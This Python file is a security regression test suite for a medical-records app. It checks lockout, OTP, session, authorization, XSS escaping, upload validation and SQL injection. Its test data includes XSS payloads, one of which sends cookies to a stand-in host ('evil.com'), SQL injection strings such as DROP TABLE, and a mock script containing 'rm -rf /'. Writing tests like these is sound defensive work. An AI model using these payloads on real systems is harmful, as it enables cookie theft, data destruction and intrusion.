"""
MediTimeline - Security Regression Test Suite
Covers 7 critical security domains:
  1. Account lockout after repeated failed logins
  2. Keyed HMAC OTP: cooldown, expiry, max attempts, single-use
  3. Session inactivity & max lifetime enforcement
  4. Cross-user authorization isolation
  5. HTML / XSS injection escaping
  6. File upload magic byte validation (extension spoofing)
  7. SQL injection resilience in all input fields
"""

import os
import sys
import io
import html as html_module
import sqlite3
import time
from datetime import datetime, timedelta
from unittest.mock import MagicMock, patch

import database as db
import auth
import ai_summary
from ocr import validate_uploaded_document

GREEN  = "\033[92m"
RED    = "\033[91m"
YELLOW = "\033[93m"
CYAN   = "\033[96m"
BOLD   = "\033[1m"
RESET  = "\033[0m"

PASS_COUNT = 0
FAIL_COUNT = 0


def ok(msg):
    global PASS_COUNT
    PASS_COUNT += 1
    print(f"  {GREEN}[PASS]{RESET} {msg}")


def fail(msg, detail=""):
    global FAIL_COUNT
    FAIL_COUNT += 1
    print(f"  {RED}[FAIL]{RESET} {msg}")
    if detail:
        print(f"        {YELLOW}Detail: {detail}{RESET}")


def section(title):
    print(f"\n{BOLD}{CYAN}{'=' * 68}{RESET}")
    print(f"{BOLD}{CYAN}  {title}{RESET}")
    print(f"{BOLD}{CYAN}{'=' * 68}{RESET}")


def _ts():
    return int(datetime.now().timestamp() * 1000)


# ============================================================
# SECURITY TEST 1 — Account Lockout (Brute-Force Protection)
# ============================================================
def test_account_lockout():
    section("SECURITY TEST 1: Account Lockout (Brute-Force Protection)")

    uname = f"lockout_{_ts()}"
    uid, _ = db.register_personal_user(
        username=uname, password="Lockout@Test1",
        email=f"{uname}@test.com", phone="",
        full_name="Lockout Test", dob_str="1990-01-01"
    )
    if uid is None:
        fail("Could not create lockout test user")
        return

    # 4 failures — should NOT lock yet (threshold=5)
    for _ in range(4):
        db.record_failed_login(uname, max_attempts=5, lockout_minutes=15)
    user = db.authenticate_user(uname)
    if not user.get("is_locked"):
        ok("4 failed attempts: account still accessible (threshold not yet reached)")
    else:
        fail("4 failed attempts should NOT lock the account")

    # 5th failure — must trigger lock
    db.record_failed_login(uname, max_attempts=5, lockout_minutes=15)
    user = db.authenticate_user(uname)
    if user.get("is_locked"):
        rem = user.get("lockout_remaining_seconds", 0)
        ok(f"5th failure locks account (lockout remaining: ~{rem}s, ~15 min)")
    else:
        fail("5 failed attempts should lock account — lockout not triggered")

    # Locked account returns is_locked flag even with correct password scenario
    if user.get("is_locked"):
        ok("Locked account flag prevents further auth regardless of credentials")
    else:
        fail("Locked account should expose is_locked=True")

    # Successful login resets counter & clears lock
    db.record_successful_login(uid)
    user_reset = db.authenticate_user(uname)
    if not user_reset.get("is_locked"):
        ok("Successful login clears lockout — account accessible again")
    else:
        fail("record_successful_login() did not clear the lockout")

    conn = db.get_connection()
    row = conn.execute(
        "SELECT failed_login_attempts, locked_until FROM users WHERE id=?", (uid,)
    ).fetchone()
    conn.close()
    if row and row["failed_login_attempts"] == 0 and row["locked_until"] is None:
        ok("DB confirmed: failed_login_attempts=0, locked_until=NULL after reset")
    else:
        fail("DB counter/lockout not properly cleared",
             f"attempts={row['failed_login_attempts']}, locked_until={row['locked_until']}")


# ============================================================
# SECURITY TEST 2 — Keyed HMAC OTP Controls
# ============================================================
def test_otp_security():
    section("SECURITY TEST 2: Keyed HMAC OTP Security Controls")

    contact = f"sec_otp_{_ts()}@test.com"

    # 2a. OTP generation
    otp, err = db.generate_and_store_otp(contact, purpose="sec_test", expiry_minutes=5)
    if otp and err is None and len(otp) == 6 and otp.isdigit():
        ok("OTP generated: 6-digit, cryptographically random (secrets.randbelow)")
    else:
        fail("OTP generation failed", f"otp={otp}, err={err}")
        return

    # 2b. Cooldown: immediate re-request must be blocked
    otp2, err2 = db.generate_and_store_otp(
        contact, purpose="sec_test", expiry_minutes=5, cooldown_seconds=60
    )
    if otp2 is None and err2 and "wait" in err2.lower():
        ok(f"Cooldown enforced — immediate re-request blocked: '{err2}'")
    else:
        fail("Cooldown NOT enforced: second OTP issued immediately", f"otp2={otp2}")

    # 2c-2e: Use a fresh contact so the OTP is not invalidated by cooldown-bypass above
    contact2 = f"sec_otp2_{_ts()}@test.com"
    otp_fresh, err_f = db.generate_and_store_otp(contact2, purpose="sec_test", expiry_minutes=5)
    if otp_fresh is None:
        fail("Fresh OTP generation failed", err_f)
        return

    # 2c. Wrong code rejected
    success, msg = db.verify_otp_code(contact2, "000000", purpose="sec_test")
    if not success:
        ok(f"Wrong OTP rejected: '{msg}'")
    else:
        fail("Wrong OTP '000000' was incorrectly accepted")

    # 2d. Correct OTP accepted
    success, msg = db.verify_otp_code(contact2, otp_fresh, purpose="sec_test")
    if success:
        ok("Correct OTP accepted and verified")
    else:
        fail("Valid OTP was rejected", msg)

    # 2e. Single-use: second use of same OTP rejected
    reuse_ok, _ = db.verify_otp_code(contact2, otp_fresh, purpose="sec_test")
    if not reuse_ok:
        ok("Single-use enforcement: consumed OTP rejected on re-use")
    else:
        fail("CRITICAL: Consumed OTP accepted a second time — single-use BROKEN!")

    # 2f. Max attempt exhaustion invalidates token
    c_ex = f"exhaust_{_ts()}@test.com"
    otp_ex, _ = db.generate_and_store_otp(c_ex, purpose="ex_sec")
    for _ in range(3):
        db.verify_otp_code(c_ex, "111111", purpose="ex_sec", max_attempts=3)
    ex_ok, ex_msg = db.verify_otp_code(c_ex, otp_ex, purpose="ex_sec", max_attempts=3)
    if not ex_ok:
        ok(f"Max attempt exhaustion invalidates token: '{ex_msg}'")
    else:
        fail("CRITICAL: OTP accepted after max attempts exceeded!")

    # 2g. Expiry enforcement via injected expired record
    c_exp = f"exp_{_ts()}@test.com"
    conn = db.get_connection()
    past = (datetime.utcnow() - timedelta(minutes=10)).strftime("%Y-%m-%d %H:%M:%S")
    exp_code = "987654"
    exp_hash = db._hash_otp(exp_code, c_exp.lower(), "exp_test")
    conn.execute(
        "INSERT INTO otps (contact, otp_hash, purpose, attempts, is_used, expires_at) "
        "VALUES (?,?,?,0,0,?)",
        (c_exp, exp_hash, "exp_test", past)
    )
    conn.commit()
    conn.close()
    exp_ok, exp_msg = db.verify_otp_code(c_exp, exp_code, purpose="exp_test")
    if not exp_ok and "expired" in exp_msg.lower():
        ok(f"Expired OTP rejected: '{exp_msg}'")
    else:
        fail("Expired OTP was not rejected", f"success={exp_ok}, msg={exp_msg}")

    # 2h. OTP stored as 64-char HMAC-SHA256 hex (never plaintext)
    conn2 = db.get_connection()
    row = conn2.execute(
        "SELECT otp_hash FROM otps WHERE contact=? ORDER BY id DESC LIMIT 1",
        (contact.lower(),)
    ).fetchone()
    conn2.close()
    if row and len(row["otp_hash"]) == 64:
        ok("OTP stored as 64-char HMAC-SHA256 hex digest — not plaintext")
    else:
        fail("OTP hash format unexpected", f"hash={row['otp_hash'] if row else 'N/A'}")


# ============================================================
# SECURITY TEST 3 — Session Timeout Enforcement
# ============================================================
def test_session_timeout():
    section("SECURITY TEST 3: Session Inactivity & Max Lifetime Enforcement")

    import auth as auth_module

    now = datetime.now()

    # 3a. Inactivity timeout: last_active > 30 min ago
    fake1 = {
        "logged_in": True,
        "last_active": (now - timedelta(minutes=35)).isoformat(),
        "login_timestamp": (now - timedelta(hours=1)).isoformat(),
    }
    with patch.object(auth_module.st, "session_state", fake1):
        valid, msg = auth.check_session_validity()
        if not valid and "inactivity" in msg.lower():
            ok(f"30-min inactivity timeout enforced: '{msg}'")
        else:
            fail("Inactivity timeout not triggered", f"valid={valid}, msg='{msg}'")

    # 3b. Max session lifetime: login_timestamp > 8 hours ago
    fake2 = {
        "logged_in": True,
        "last_active": now.isoformat(),
        "login_timestamp": (now - timedelta(hours=9)).isoformat(),
    }
    with patch.object(auth_module.st, "session_state", fake2):
        valid2, msg2 = auth.check_session_validity()
        if not valid2 and "maximum session" in msg2.lower():
            ok(f"8-hour max session lifetime enforced: '{msg2}'")
        else:
            fail("Max session lifetime not enforced", f"valid={valid2}, msg='{msg2}'")

    # 3c. Fresh active session must remain valid
    fake3 = {
        "logged_in": True,
        "last_active": (now - timedelta(minutes=5)).isoformat(),
        "login_timestamp": (now - timedelta(hours=1)).isoformat(),
    }
    with patch.object(auth_module.st, "session_state", fake3):
        valid3, msg3 = auth.check_session_validity()
        if valid3:
            ok("Fresh active session correctly preserved (no premature expiry)")
        else:
            fail("Fresh session incorrectly expired", f"msg='{msg3}'")

    # 3d. Non-authenticated session returns (False, "") without error
    fake4 = {"logged_in": False}
    with patch.object(auth_module.st, "session_state", fake4):
        valid4, msg4 = auth.check_session_validity()
        if not valid4 and msg4 == "":
            ok("Non-authenticated session returns (False, '') cleanly")
        else:
            fail("Unexpected behavior on non-authenticated session", f"valid={valid4}, msg='{msg4}'")


# ============================================================
# SECURITY TEST 4 — Cross-User Authorization Isolation
# ============================================================
def test_cross_user_isolation():
    section("SECURITY TEST 4: Cross-User Data Isolation (Authorization Enforcement)")

    ts = _ts()
    uid_a, _ = db.register_personal_user(
        username=f"alpha_{ts}", password="Alpha@Test1",
        email=f"alpha_{ts}@test.com", phone="",
        full_name="User Alpha", dob_str="1985-03-10"
    )
    uid_b, _ = db.register_personal_user(
        username=f"beta_{ts}", password="Beta@Test1",
        email=f"beta_{ts}@test.com", phone="",
        full_name="User Beta", dob_str="1990-07-20"
    )
    if not uid_a or not uid_b:
        fail("Failed to create isolation test users")
        return

    rec_a = db.add_medical_record(
        user_id=uid_a, event_date="2026-01-15",
        hospital_name="Alpha Clinic", doctor_name="Dr. Alpha",
        diagnosis="Isolation Test Diagnosis A", event_type="Consultation"
    )

    # 4a. User B cannot READ User A's record
    cross_read = db.get_user_record_by_id(uid_b, rec_a)
    if cross_read is None:
        ok("Cross-read BLOCKED: User B cannot read User A's record")
    else:
        fail("CRITICAL SECURITY FAILURE: User B read User A's record!")

    # 4b. User B cannot UPDATE User A's record
    upd = db.update_medical_record(
        user_id=uid_b, record_id=rec_a,
        event_date="2026-01-15", hospital_name="Hacked",
        doctor_name="Attacker", diagnosis="TAMPERED"
    )
    if not upd:
        ok("Cross-update BLOCKED: User B cannot modify User A's record")
    else:
        fail("CRITICAL SECURITY FAILURE: User B modified User A's record!")

    # Verify record content is intact
    rec_check = db.get_user_record_by_id(uid_a, rec_a)
    if rec_check and "TAMPERED" not in rec_check.get("diagnosis", ""):
        ok("Record integrity confirmed — diagnosis NOT tampered by unauthorized user")
    else:
        fail("Record was tampered!", str(rec_check))

    # 4c. User B cannot DELETE User A's record
    del_ok = db.delete_medical_record(user_id=uid_b, record_id=rec_a)
    if not del_ok:
        ok("Cross-delete BLOCKED: User B cannot delete User A's record")
    else:
        fail("CRITICAL SECURITY FAILURE: User B deleted User A's record!")

    still = db.get_user_record_by_id(uid_a, rec_a)
    if still:
        ok("User A's record still exists after User B's failed delete attempt")
    else:
        fail("User A's record was deleted by unauthorized User B!")

    # 4d. get_user_stats per-user isolation
    stats_a = db.get_user_stats(uid_a)
    stats_b = db.get_user_stats(uid_b)
    if stats_a["total_records"] >= 1 and stats_b["total_records"] == 0:
        ok(f"get_user_stats() isolated: A={stats_a['total_records']} records, B={stats_b['total_records']} records")
    else:
        fail("get_user_stats() leaking cross-user data",
             f"A={stats_a['total_records']}, B={stats_b['total_records']}")

    # 4e. get_user_records query cannot retrieve other user's records
    records_b_as_b = db.get_user_records(uid_b)
    if records_b_as_b.empty or rec_a not in records_b_as_b["record_id"].values:
        ok("get_user_records() returns only the requesting user's records")
    else:
        fail("CRITICAL: get_user_records() leaked User A's record to User B's query!")


# ============================================================
# SECURITY TEST 5 — XSS / HTML Injection Escaping
# ============================================================
def test_xss_escaping():
    section("SECURITY TEST 5: HTML / XSS Injection Escaping in Rendered Summaries")

    import pandas as pd

    xss_payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(1)>",
        "';DROP TABLE users;--",
        '<a href="javascript:void(0)" onclick="steal()">Click</a>',
        "<svg onload=alert(1)>",
        '"><script>document.location="http://evil.com?c="+document.cookie</script>',
    ]

    ts = _ts()
    uid, _ = db.register_personal_user(
        username=f"xss_{ts}", password="XssTest@123",
        email=f"xss_{ts}@test.com", phone="",
        full_name="XSS Test User", dob_str="1990-01-01"
    )

    for payload in xss_payloads:
        db.add_medical_record(
            user_id=uid, event_date="2026-06-01",
            hospital_name=payload, doctor_name=payload,
            diagnosis=payload, medicine=payload,
            event_type="Consultation"
        )

    records_df = db.get_user_records(uid)
    summary_html = ai_summary.generate_period_summary(records_df, period_label="XSS Test Period")

    all_safe = True
    for payload in xss_payloads:
        if payload in summary_html:
            fail(f"XSS payload found unescaped in summary HTML", f"raw: {payload[:60]}")
            all_safe = False

    if all_safe:
        ok("All 6 XSS payloads escaped — no raw injection in period summary HTML")

    # Verify truly unescaped tag patterns are absent from output.
    # Note: payloads like 'onerror=alert(1)' appear in escaped form as
    # '&lt;img src=x onerror=alert(1)&gt;' — the text 'onerror=' is inside
    # entity-encoded angle brackets, so it is safe. We check for the raw
    # unescaped pattern '<img' which would indicate a real injection.
    raw_unescaped_patterns = [
        "<script>",
        "<img src=",
        "<svg onload",
        "<a href=\"javascript:",
    ]
    raw_found = [p for p in raw_unescaped_patterns if p in summary_html]
    # Also check that payloads that ARE raw in output are preceded by a literal <
    # The only < in the output should be from trusted template HTML (e.g. <div>, <li>, <ul>)
    # not from user data — which must be &lt;
    if not raw_found:
        ok("Confirmed: no raw unescaped <script>, <img, <svg, or javascript: in rendered output")
    else:
        fail("CRITICAL: Raw unescaped tag(s) found in rendered HTML output!",
             f"Found: {raw_found}")

    # html.escape() unit check
    test_esc = html_module.escape("<script>alert('xss')</script>")
    if "<script>" not in test_esc and "&lt;" in test_esc:
        ok("html.escape() unit check: < and > converted to &lt; &gt; correctly")
    else:
        fail("html.escape() is not working correctly!", f"result={test_esc}")

    # Emergency card context: malicious name in profile
    malicious_name = "<b>Evil</b><script>steal()</script>"
    escaped_name = html_module.escape(malicious_name)
    if "<b>" not in escaped_name and "<script>" not in escaped_name:
        ok("Profile-based XSS neutralized by html.escape() in card context")
    else:
        fail("Profile XSS not neutralized", f"result={escaped_name}")


# ============================================================
# SECURITY TEST 6 — Magic Byte File Validation
# ============================================================
def test_magic_byte_validation():
    section("SECURITY TEST 6: File Upload Magic Byte Validation (Extension Spoofing)")

    def _mock_file(name, content_bytes):
        f = MagicMock()
        f.name = name
        f.size = len(content_bytes)
        buf = io.BytesIO(content_bytes)
        f.read = buf.read
        f.seek = buf.seek
        f.getvalue = lambda: content_bytes
        return f

    PDF_MAGIC = b"%PDF-1.4 " + b"x" * 200
    PNG_MAGIC = b"\x89PNG\r\n\x1a\n" + b"fake png data"
    JPG_MAGIC = b"\xff\xd8\xff\xe0" + b"fake jpeg"

    # 6a. Valid PDF accepted
    v, e = validate_uploaded_document(_mock_file("report.pdf", PDF_MAGIC))
    if v:
        ok("Valid PDF (correct magic bytes) accepted")
    else:
        fail("Valid PDF incorrectly rejected", e)

    # 6b. Spoofed PDF (JPEG bytes, .pdf extension) blocked
    v, e = validate_uploaded_document(_mock_file("evil.pdf", JPG_MAGIC))
    if not v and "signature" in e.lower():
        ok(f"Spoofed PDF (JPEG content) blocked: '{e}'")
    else:
        fail("CRITICAL: Spoofed PDF accepted!", e)

    # 6c. Valid PNG accepted
    v, e = validate_uploaded_document(_mock_file("scan.png", PNG_MAGIC))
    if v:
        ok("Valid PNG (correct magic bytes) accepted")
    else:
        fail("Valid PNG incorrectly rejected", e)

    # 6d. Spoofed PNG (PDF bytes, .png extension) blocked
    v, e = validate_uploaded_document(_mock_file("attack.png", PDF_MAGIC))
    if not v and "signature" in e.lower():
        ok(f"Spoofed PNG (PDF content) blocked: '{e}'")
    else:
        fail("CRITICAL: Spoofed PNG accepted!", e)

    # 6e. Valid JPEG accepted
    v, e = validate_uploaded_document(_mock_file("photo.jpg", JPG_MAGIC))
    if v:
        ok("Valid JPEG (correct magic bytes) accepted")
    else:
        fail("Valid JPEG incorrectly rejected", e)

    # 6f. Spoofed JPEG (HTML payload, .jpg extension) blocked
    html_payload = b"<html><script>evil()</script></html>"
    v, e = validate_uploaded_document(_mock_file("payload.jpg", html_payload))
    if not v and "signature" in e.lower():
        ok(f"Spoofed JPEG (HTML payload) blocked: '{e}'")
    else:
        fail("CRITICAL: HTML payload disguised as .jpg accepted!", e)

    # 6g. Oversized file (>10 MB) blocked
    big = b"%PDF-" + b"A" * (11 * 1024 * 1024)
    v, e = validate_uploaded_document(_mock_file("huge.pdf", big))
    if not v and "size" in e.lower():
        ok(f"Oversized file (>10 MB) blocked: '{e}'")
    else:
        fail("Oversized file was not rejected", e)

    # 6h. Disallowed extension (.exe) blocked
    v, e = validate_uploaded_document(_mock_file("virus.exe", b"MZ\x90\x00"))
    if not v and "unsupported" in e.lower():
        ok(f"Disallowed extension (.exe) blocked: '{e}'")
    else:
        fail("Executable file (.exe) was accepted — must be blocked!", e)

    # 6i. Disallowed extension (.sh) blocked
    v, e = validate_uploaded_document(_mock_file("run.sh", b"#!/bin/bash\nrm -rf /"))
    if not v and "unsupported" in e.lower():
        ok(f"Disallowed extension (.sh) blocked: '{e}'")
    else:
        fail("Shell script (.sh) was accepted — must be blocked!", e)


# ============================================================
# SECURITY TEST 7 — SQL Injection Resilience
# ============================================================
def test_sql_injection():
    section("SECURITY TEST 7: SQL Injection Resilience (Parameterized Query Verification)")

    payloads = [
        "' OR '1'='1",
        "' OR 1=1 --",
        "'; DROP TABLE users; --",
        "' UNION SELECT * FROM users --",
        "1' AND SLEEP(5) --",
        "admin'--",
        "' OR 'x'='x",
    ]

    # 7a. Injection in authenticate_user username field
    injected_auth = False
    for p in payloads:
        try:
            result = db.authenticate_user(p)
            if result is not None and result.get("username", "").strip() != p.strip():
                fail("SQL injection in authenticate_user returned wrong user", f"payload={p[:50]}")
                injected_auth = True
                break
        except Exception as ex:
            fail("authenticate_user raised exception on SQL payload", str(ex))
            injected_auth = True
            break
    if not injected_auth:
        ok("authenticate_user(): all SQL payloads handled safely (no unintended auth)")

    # 7b. Database tables survive injection attempts
    for p in payloads:
        try:
            db.register_personal_user(
                username=p, password="InjTest@123",
                email=f"inj_{_ts()}@test.com", phone="",
                full_name="Inj Test", dob_str="1990-01-01"
            )
        except Exception:
            pass

    conn = db.get_connection()
    tables = [r[0] for r in conn.execute(
        "SELECT name FROM sqlite_master WHERE type='table'"
    ).fetchall()]
    conn.close()
    for critical_table in ["users", "medical_history", "otps", "documents"]:
        if critical_table in tables:
            pass
        else:
            fail(f"CRITICAL: Table '{critical_table}' missing after injection attempts!")
            break
    else:
        ok("All critical tables intact after SQL injection attempts in register_personal_user()")

    # 7c. Injection in get_user_records search_term
    ts = _ts()
    uid_s, _ = db.register_personal_user(
        username=f"srch_{ts}", password="Srch@Test1",
        email=f"srch_{ts}@test.com", phone="",
        full_name="Search Inj Test", dob_str="1992-05-05"
    )
    search_failed = False
    for p in payloads:
        try:
            results = db.get_user_records(uid_s, search_term=p)
        except Exception as ex:
            fail("get_user_records() raised exception with SQL payload", str(ex))
            search_failed = True
            break
    if not search_failed:
        ok("get_user_records(search_term=<payload>): all payloads handled without exception")

    # 7d. Parameterized user_id ownership check integrity
    uid_t, _ = db.register_personal_user(
        username=f"own_{ts}", password="Own@Test11",
        email=f"own_{ts}@test.com", phone="",
        full_name="Owner Test", dob_str="1988-12-12"
    )
    rec_t = db.add_medical_record(
        user_id=uid_t, event_date="2026-03-01",
        hospital_name="Owner Hospital", doctor_name="Dr. Owner",
        diagnosis="Parameterized Ownership Test", event_type="Consultation"
    )
    cross = db.get_user_record_by_id(uid_s, rec_t)
    if cross is None:
        ok("Parameterized ownership check: uid_s cannot retrieve uid_t's record")
    else:
        fail("CRITICAL: Parameterized query not enforcing user_id isolation!")

    # 7e. audit_log with injection payloads
    failed_audit = False
    for p in payloads[:3]:
        try:
            db.add_audit_log(uid_t, "User", p, p)
        except Exception as ex:
            fail("add_audit_log() raised exception with SQL payload", str(ex))
            failed_audit = True
            break
    if not failed_audit:
        ok("add_audit_log(): injection payloads stored as literal strings without error")


# ============================================================
# MAIN RUNNER
# ============================================================
def run_security_tests():
    print(f"\n{BOLD}{'#' * 68}{RESET}")
    print(f"{BOLD}  MEDITIMELINE — SECURITY REGRESSION TEST SUITE{RESET}")
    print(f"{BOLD}{'#' * 68}{RESET}")
    print(f"  Timestamp : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"  Database  : {db.DB_NAME}")
    otp_key_source = "Environment Variable (OTP_SECRET_KEY)" if os.getenv("OTP_SECRET_KEY") else "Default Fallback Key (set OTP_SECRET_KEY in .env for production)"
    print(f"  OTP HMAC  : {otp_key_source}")

    db.create_database()

    test_account_lockout()
    test_otp_security()
    test_session_timeout()
    test_cross_user_isolation()
    test_xss_escaping()
    test_magic_byte_validation()
    test_sql_injection()

    total = PASS_COUNT + FAIL_COUNT
    print(f"\n{BOLD}{'=' * 68}{RESET}")
    if FAIL_COUNT == 0:
        print(f"{BOLD}{GREEN}  ALL {total} SECURITY CHECKS PASSED — SYSTEM IS SECURE{RESET}")
    else:
        print(f"{BOLD}{RED}  RESULTS: {PASS_COUNT}/{total} passed | {FAIL_COUNT} FAILED{RESET}")
        print(f"{BOLD}{YELLOW}  Fix the above failures before any production deployment!{RESET}")
    print(f"{BOLD}{'=' * 68}{RESET}\n")

    if FAIL_COUNT > 0:
        sys.exit(1)


if __name__ == "__main__":
    run_security_tests()

